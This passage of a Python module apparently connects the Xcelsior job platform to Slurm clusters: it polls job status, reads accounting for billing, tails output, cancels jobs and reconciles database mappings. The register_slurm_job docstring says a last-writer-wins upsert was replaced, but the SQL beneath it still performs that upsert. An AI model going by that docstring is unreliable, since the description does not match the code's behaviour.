        # Fall back to sacct for completed jobs
        r2 = runner.run(
            [
                "sacct",
                "-j",
                str(slurm_job_id),
                "--noheader",
                "--parsable2",
                "-o",
                "JobID,State,Elapsed,ExitCode,MaxRSS,MaxVMSize",
            ],
            timeout=10,
        )

        if r2.returncode == 0 and r2.stdout.strip():
            for line in r2.stdout.strip().split("\n"):
                parts = line.split("|")
                # Skip sub-step entries (e.g., "12345.batch")
                if "." not in parts[0]:
                    # sacct prints "CANCELLED by <uid>"; the raw string used
                    # to miss the map and fall through to "failed".
                    slurm_state = normalize_slurm_state(parts[1]) if len(parts) > 1 else "UNKNOWN"
                    return {
                        "slurm_job_id": slurm_job_id,
                        "slurm_state": slurm_state,
                        "xcelsior_state": SLURM_STATE_MAP.get(slurm_state, "unknown"),
                        "elapsed": parts[2] if len(parts) > 2 else "?",
                        "exit_code": parts[3] if len(parts) > 3 else "?",
                        "max_rss": parts[4] if len(parts) > 4 else "?",
                        "max_vmsize": parts[5] if len(parts) > 5 else "?",
                        "source": "sacct",
                    }

        return {
            "slurm_job_id": slurm_job_id,
            "slurm_state": "UNKNOWN",
            "xcelsior_state": "failed",
            "error": "Job not found in squeue or sacct",
            "error_code": "not_found",
        }

    except subprocess.TimeoutExpired:
        return _error("timeout", "Status poll timed out")
    except FileNotFoundError:
        return _error("slurm_unavailable", "Slurm not available")
    except Exception as e:
        return _error("adapter_exception", str(e))


# ── Accounting (metering) ────────────────────────────────────────────

_ACCT_FIELDS = (
    "JobID",
    "JobName",
    "State",
    "Submit",
    "Start",
    "End",
    "ElapsedRaw",
    "ExitCode",
    "AllocTRES",
    "NodeList",
    "Partition",
)


def _epoch_or_none(value: str) -> float | None:
    v = (value or "").strip()
    return float(v) if v.isdigit() and int(v) > 0 else None


def parse_alloc_tres(tres: str) -> dict:
    """'billing=2,cpu=2,gres/gpu=1,mem=3G,node=1' → {'cpu': 2, 'gpu': 1, ...}."""
    out: dict = {"cpu": 0, "gpu": 0, "node": 0}
    for item in (tres or "").split(","):
        if "=" not in item:
            continue
        key, val = item.split("=", 1)
        if key == "gres/gpu" and val.isdigit():
            out["gpu"] = int(val)
        elif key in ("cpu", "node") and val.isdigit():
            out[key] = int(val)
        elif key == "mem":
            out["mem"] = val
    return out


def get_slurm_job_accounting(slurm_job_id, *, profile_name=None, runner=None):
    """Accounting record for one job, in the shape per-second billing needs.

    Timestamps come from slurmdbd as Unix epoch seconds (SLURM_TIME_FORMAT
    =%s), so there is no timezone parsing. ``duration_sec`` is Slurm's own
    ElapsedRaw. ``gpu_seconds`` = duration × allocated GPUs (AllocTRES
    gres/gpu), which is what billing.UsageMeter.gpu_seconds records.

    Requires AccountingStorageType=accounting_storage/slurmdbd.
    """
    if not _SLURM_JOB_ID_RE.match(str(slurm_job_id)):
        return _error("invalid_job_id", f"invalid Slurm job id: {slurm_job_id!r}")
    try:
        _profile, runner = _resolve(profile_name, runner)
    except SlurmAdapterError as e:
        return _error(e.code, str(e))
    argv = [
        "sacct",
        "-j",
        str(slurm_job_id),
        "-X",
        "--noheader",
        "--parsable2",
        "--noconvert",
        "-o",
        ",".join(_ACCT_FIELDS),
    ]
    try:
        r = runner.run(argv, timeout=15, env={"SLURM_TIME_FORMAT": "%s"})
    except subprocess.TimeoutExpired:
        return _error("timeout", "sacct timed out")
    except FileNotFoundError:
        return _error("slurm_unavailable", "Slurm not available")
    failure = _transport_failure(r, runner)
    if failure:
        return failure
    if r.returncode != 0:
        msg = r.stderr.strip()
        code = (
            "accounting_disabled"
            if "accounting storage is disabled" in msg.lower()
            else "sacct_failed"
        )
        return _error(code, msg)
    row = None
    for line in r.stdout.strip().splitlines():
        parts = line.split("|")
        if len(parts) == len(_ACCT_FIELDS) and parts[0] == str(slurm_job_id):
            row = dict(zip(_ACCT_FIELDS, parts))
            break
    if row is None:
        return _error("not_found", f"job {slurm_job_id} not in accounting (yet)")

    slurm_state = normalize_slurm_state(row["State"])
    xstate = SLURM_STATE_MAP.get(slurm_state, "unknown")
    terminal = xstate in SLURM_TERMINAL_STATES
    submitted = _epoch_or_none(row["Submit"])
    started = _epoch_or_none(row["Start"])
    ended = _epoch_or_none(row["End"]) if terminal else None
    elapsed = int(row["ElapsedRaw"]) if row["ElapsedRaw"].isdigit() else 0
    tres = parse_alloc_tres(row["AllocTRES"])
    return {
        "slurm_job_id": str(slurm_job_id),
        "job_name": row["JobName"],
        "slurm_state": slurm_state,
        "raw_state": row["State"],
        "xcelsior_state": xstate,
        "terminal": terminal,
        "submitted_at": submitted,
        "started_at": started,
        "completed_at": ended,
        "duration_sec": elapsed,
        "gpu_count": tres["gpu"],
        "cpu_count": tres["cpu"],
        "gpu_seconds": elapsed * tres["gpu"],
        "node_list": row["NodeList"],
        "partition": row["Partition"],
        "exit_code": row["ExitCode"],
        "alloc_tres": row["AllocTRES"],
        # Slurm leaves Start unset (or equal to End with zero elapsed) for a
        # job cancelled while pending; nothing ran, nothing is billable.
        "billable": started is not None and elapsed > 0,
    }


def accounting_to_meter_fields(acct: dict) -> dict:
    """Project an accounting record onto billing.UsageMeter's time fields.

    UsageMeter takes floats, with completed_at 0.0 while the job runs.
    """
    return {
        "started_at": float(acct.get("started_at") or 0.0),
        "completed_at": float(acct.get("completed_at") or 0.0),
        "duration_sec": float(acct.get("duration_sec") or 0),
        "gpu_seconds": float(acct.get("gpu_seconds") or 0),
    }


# ── Output retrieval ─────────────────────────────────────────────────


def get_slurm_job_output(
    slurm_job_id,
    xcelsior_job_id,
    *,
    profile_name=None,
    runner=None,
    stream="out",
    max_bytes=65536,
):
    """Read the tail of a job's stdout/stderr file from the submit host.

    Works where the profile's output_dir is visible from the submit host:
    a shared filesystem on real clusters (/scratch), or the submit node
    itself on a cluster without one.
    """
    if not _SLURM_JOB_ID_RE.match(str(slurm_job_id)):
        return _error("invalid_job_id", f"invalid Slurm job id: {slurm_job_id!r}")
    if stream not in ("out", "err"):
        return _error("invalid_request", "stream must be 'out' or 'err'")
    try:
        _require(_JOB_ID_RE, str(xcelsior_job_id), "job_id")
        profile, runner = _resolve(profile_name, runner)
        account = os.environ.get(profile["account_env"], "")
        path = f"{_output_dir(profile, _remote_user(profile, runner), account)}/xcl-{xcelsior_job_id}-{slurm_job_id}.{stream}"
    except SlurmAdapterError as e:
        return _error(e.code, str(e))
    try:
        r = runner.run(["tail", "-c", str(int(max_bytes)), "--", path], timeout=15)
    except subprocess.TimeoutExpired:
        return _error("timeout", "output read timed out")
    except FileNotFoundError:
        return _error("io_error", "tail not available")
    failure = _transport_failure(r, runner)
    if failure:
        return failure
    if r.returncode != 0:
        return _error("output_unavailable", r.stderr.strip() or f"cannot read {path}", path=path)
    return {"slurm_job_id": str(slurm_job_id), "path": path, "stream": stream, "content": r.stdout}


def cancel_slurm_job(slurm_job_id, *, profile_name=None, runner=None):
    """Cancel a Slurm job.

    Runs ``scancel -v``: at normal verbosity Slurm 25.11 exits 0 and prints
    nothing for a job that already ended (past MinJobAge) or never
    existed, so a plain scancel "succeeds" on any id. Verbose output names
    the failure, and accounting tells an ended job from an unknown one.

    Returns {"cancelled": True, ...} or an error with error_code
    ``already_terminal`` (with the final state) or ``not_found``.
    """
    if not _SLURM_JOB_ID_RE.match(str(slurm_job_id)):
        return _error("invalid_job_id", f"invalid Slurm job id: {slurm_job_id!r}")
    try:
        _profile, runner = _resolve(profile_name, runner)
    except SlurmAdapterError as e:
        return _error(e.code, str(e))
    if not _slurm_reachable(runner):
        return _error("slurm_unavailable", "Slurm not available")

    try:
        r = runner.run(["scancel", "-v", str(slurm_job_id)], timeout=10)
        failure = _transport_failure(r, runner)
        if failure:
            return failure
        stderr = (r.stderr or "").strip()
        errors = [line for line in stderr.splitlines() if "error" in line.lower()]
        if r.returncode == 0 and not errors:
            return {"cancelled": True, "slurm_job_id": slurm_job_id}
        detail = "; ".join(errors) or stderr
        if "already completing or completed" in stderr or "Invalid job id" in stderr:
            acct = get_slurm_job_accounting(slurm_job_id, profile_name=profile_name, runner=runner)
            if "error" not in acct and acct.get("terminal"):
                return _error(
                    "already_terminal",
                    f"job {slurm_job_id} already ended ({acct['slurm_state']})",
                    slurm_state=acct["slurm_state"],
                    xcelsior_state=acct["xcelsior_state"],
                )
            if "already completing or completed" in stderr:
                return _error("already_terminal", f"scancel failed: {detail}")
            return _error("not_found", f"scancel failed: {detail}")
        return _error("scancel_failed", f"scancel failed: {detail}")
    except subprocess.TimeoutExpired:
        return _error("timeout", "scancel timed out")
    except Exception as e:
        return _error("adapter_exception", str(e))


# ── Sync Engine ──────────────────────────────────────────────────────
# Tracks mapping between Xcelsior job_ids and Slurm job_ids.
#
# The db import is deferred into each function so this module loads on a
# Slurm submit host (or in the validation kit) without the Xcelsior
# database stack.

_slurm_job_map = {}

# States after which a mapping is settled and stops being polled. The row
# is *kept* — companion §10.1: "Historical mappings remain queryable and
# auditable." Deleting it destroys the only record that an external job
# ever ran for a tenant.
SLURM_TERMINAL_STATES = ("completed", "failed", "cancelled", "preempted")

DEFAULT_CLUSTER_ID = "unknown"


def _load_slurm_map():
    """Load open Xcelsior→Slurm mappings from the database.

    Terminal mappings are excluded: they are retained for audit, not for
    polling. The returned dict is a read-through convenience for callers
    such as the health route — it is a *snapshot*, never authority.
    """
    global _slurm_job_map
    from db import pg_connection

    fresh: dict = {}
    try:
        with pg_connection() as conn:
            rows = conn.execute(
                "SELECT xcelsior_job_id, slurm_job_id FROM slurm_job_mappings "
                "WHERE terminal_at IS NULL"
            ).fetchall()
            for row in rows:
                fresh[row[0]] = row[1]
    except Exception as e:
        log.error("Failed to load slurm map from DB: %s", e)
        return _slurm_job_map
    # Only replace the cache once the read succeeded, so a transient DB
    # error does not blank a caller's view of the fleet.
    _slurm_job_map = fresh
    return _slurm_job_map


def register_slurm_job(
    xcelsior_job_id,
    slurm_job_id,
    *,
    cluster_id: str = DEFAULT_CLUSTER_ID,
    tenant_id: str | None = None,
    attempt_id: str | None = None,
    submit_idempotency_key: str | None = None,
):
    """Register a mapping between an Xcelsior job and an external Slurm job.

    Idempotent on ``(tenant_id, submit_idempotency_key)`` and unique on
    ``(cluster_id, slurm_job_id)``, so a retried submit cannot create a
    second external job or let two Xcelsior jobs act on one Slurm job
    (companion §10.1). Pass the profile's ``cluster_id``: Slurm job ids
    are only unique per cluster, so every mapping filed under "unknown"
    would collide as soon as a second cluster is connected.

    The previous implementation was ``ON CONFLICT (xcelsior_job_id) DO
    UPDATE SET slurm_job_id`` — last-writer-wins, which silently
    re-pointed a job at a different external id and orphaned the first.
    """
    from db import pg_transaction

    now = time.time()
    key = submit_idempotency_key or f"submit:{xcelsior_job_id}"
    with pg_transaction() as conn:
        conn.execute(
            """
            INSERT INTO slurm_job_mappings
                (xcelsior_job_id, slurm_job_id, created_at, cluster_id,
                 tenant_id, xcelsior_attempt_id, submit_idempotency_key,
                 desired_state, observed_state, submitted_at, version)
            VALUES (%s, %s, %s, %s, %s, %s, %s, 'running', 'pending',
                    to_timestamp(%s), 1)
            ON CONFLICT (xcelsior_job_id) DO UPDATE
               SET slurm_job_id = EXCLUDED.slurm_job_id,
                   cluster_id = EXCLUDED.cluster_id,
                   version = slurm_job_mappings.version + 1
             WHERE slurm_job_mappings.terminal_at IS NULL
            """,
            (
                xcelsior_job_id,
                str(slurm_job_id),
                now,
                cluster_id or DEFAULT_CLUSTER_ID,
                tenant_id,
                attempt_id,
                key,
                now,
            ),
        )


def set_slurm_desired_state(xcelsior_job_id, desired_state: str) -> bool:
    """Record what Xcelsior *wants* the external job to be doing.

    Half of the bidirectional reconcile companion §10.1 asks for: without
    a desired state there is nothing to reconcile observations against,
    and a cancellation can only be expressed by deleting the row.
    """
    from db import pg_transaction

    if desired_state not in ("running", "cancelled"):
        raise ValueError(f"unsupported desired_state: {desired_state!r}")
    with pg_transaction() as conn:
        result = conn.execute(
            """UPDATE slurm_job_mappings
                  SET desired_state = %s, version = version + 1
                WHERE xcelsior_job_id = %s AND terminal_at IS NULL""",
            (desired_state, xcelsior_job_id),
        )
        return result.rowcount > 0


def _profile_key_for_cluster(cluster_id) -> str | None:
    """The profile whose cluster_id (or key) is ``cluster_id``, if any."""
    if not cluster_id or cluster_id == DEFAULT_CLUSTER_ID:
        return None
    try:
        profiles = available_profiles()
    except SlurmAdapterError:
        profiles = CLUSTER_PROFILES
    for key, prof in profiles.items():
        if (prof.get("cluster_id") or key) == cluster_id:
            return key
    return None


def sync_slurm_statuses(update_callback=None, cancel_callback=None):
    """Reconcile desired and observed state for every open Slurm mapping.

    Bidirectional, as companion §10.1 requires:

    - **observed → Xcelsior**: poll the cluster, persist ``observed_state``
      and ``last_observed_at``, and report transitions through
      ``update_callback``;
    - **desired → cluster**: a mapping whose ``desired_state`` is
      ``cancelled`` while the external job is still live gets a cancel
      request through ``cancel_callback``. Previously there was no desired
      state at all, so a cancellation could only be expressed by deleting
      the row and hoping the external job noticed.

    Terminal mappings are **stamped, not deleted** — the old code removed
    the row on completion, destroying the only record that the external
    job ever ran. They are excluded from future polls by ``terminal_at``.

    Each mapping is polled through the profile its ``cluster_id`` names,
    so one pass can cover several clusters. A failure on one row is
    logged and the pass continues.

    Args:
        update_callback: fn(xcelsior_job_id, new_xcelsior_state) for
            observed transitions (Xcelsior job vocabulary, e.g. "queued").
        cancel_callback: fn(slurm_job_id) invoked when Xcelsior wants the
            external job stopped and it is not yet terminal.

    Returns:
        list of (xcelsior_job_id, slurm_job_id, old_observed, new_observed)
        in the slurm_job_mappings.observed_state vocabulary.
    """
    from db import pg_connection, pg_transaction

    changes = []
    with pg_connection() as conn:
        mappings = conn.execute(
            "SELECT xcelsior_job_id, slurm_job_id, observed_state, desired_state, cluster_id "
            "FROM slurm_job_mappings WHERE terminal_at IS NULL"
        ).fetchall()

    for row in mappings:
        xcelsior_id, slurm_id, prev_state, desired = row[0], row[1], row[2], row[3]
        cluster_id = row[4] if len(row) > 4 else None
        profile_key = _profile_key_for_cluster(cluster_id)
        try:
            if profile_key:
                status = get_slurm_job_status(slurm_id, profile_name=profile_key)
            else:
                status = get_slurm_job_status(slurm_id)
        except Exception as e:
            log.error("slurm status poll failed for %s: %s", slurm_id, e)
            continue
        if "error" in status:
            continue

        xstate = status.get("xcelsior_state", "") or "unknown"
        new_state = OBSERVED_STATE_MAP.get(xstate, "unknown")
        is_terminal = xstate in SLURM_TERMINAL_STATES

        # Persist the observation regardless of whether it changed, so
        # last_observed_at reflects real freshness (blueprint §12.2: API
        # receipt time is what determines staleness).
        try:
            with pg_transaction() as conn:
                conn.execute(
                    """UPDATE slurm_job_mappings
                          SET observed_state = %s,
                              last_observed_at = clock_timestamp(),
                              terminal_at = CASE WHEN %s THEN clock_timestamp()
                                                 ELSE terminal_at END,
                              version = version + 1
                        WHERE xcelsior_job_id = %s""",
                    (new_state, is_terminal, xcelsior_id),
                )
        except Exception as e:
            log.error("slurm observation write failed for %s: %s", xcelsior_id, e)
            continue

        if new_state != prev_state:
            if update_callback:
                update_callback(xcelsior_id, xstate)
            changes.append((xcelsior_id, slurm_id, prev_state, new_state))

        # desired → cluster: Xcelsior wants this stopped and it is not.
        if desired == "cancelled" and not is_terminal and cancel_callback:
            try:
                cancel_callback(slurm_id)
            except Exception as e:
                log.error("slurm cancel failed for %s: %s", slurm_id, e)

    return changes


# ── CLI Integration ──────────────────────────────────────────────────


def slurm_submit_cli(job_dict, profile=None, dry_run=False):
    """CLI-friendly wrapper for Slurm submission.

    Returns formatted output string.
    """
    result = submit_to_slurm(job_dict, profile_name=profile, dry_run=dry_run)

    if "error" in result:
        return f"Error: {result['error']}"

    if dry_run:
        return (
            f"─── Generated sbatch script ───\n{result['script']}\n───────────────────────────────"
        )

    slurm_id = result.get("slurm_job_id", "?")
    xcelsior_id = result.get("xcelsior_job_id", "?")
    meta: dict = result.get("metadata", {})
    register_slurm_job(
        xcelsior_id, slurm_id, cluster_id=meta.get("cluster_id") or DEFAULT_CLUSTER_ID
    )

    return (
        f"Submitted to Slurm: {slurm_id}\n"
        f"  Xcelsior job: {xcelsior_id}\n"
        f"  Cluster:      {meta.get('profile', '?')}\n"
        f"  GPUs:         {meta.get('num_gpus', '?')} x {meta.get('gpu_type') or 'any'}\n"
        f"  Walltime:     {meta.get('walltime', '?')}\n"
        f"  Nodes:        {meta.get('nodes', '?')}"
    )


def slurm_status_cli(xcelsior_job_id=None, slurm_job_id=None):
    """CLI-friendly wrapper for Slurm status check."""
    if slurm_job_id:
        status = get_slurm_job_status(slurm_job_id)
    elif xcelsior_job_id:
        from db import pg_connection

        with pg_connection() as conn:
            row = conn.execute(
                "SELECT slurm_job_id, cluster_id FROM slurm_job_mappings "
                "WHERE xcelsior_job_id = %s",
                (xcelsior_job_id,),
            ).fetchone()
        if not row or not row[0]:
            return f"No Slurm job found for Xcelsior job {xcelsior_job_id}"
        profile_key = _profile_key_for_cluster(row[1])
        if profile_key:
            status = get_slurm_job_status(row[0], profile_name=profile_key)
        else:
            status = get_slurm_job_status(row[0])
    else:
        return "Provide either --job-id or --slurm-id"

    if "error" in status:
        return f"Error: {status['error']}"

    return (
        f"Slurm Job: {status.get('slurm_job_id', '?')}\n"
        f"  State:    {status.get('slurm_state', '?')} → {status.get('xcelsior_state', '?')}\n"
        f"  Elapsed:  {status.get('elapsed', '?')}\n"
        f"  Nodes:    {status.get('nodes', '?')}"
    )
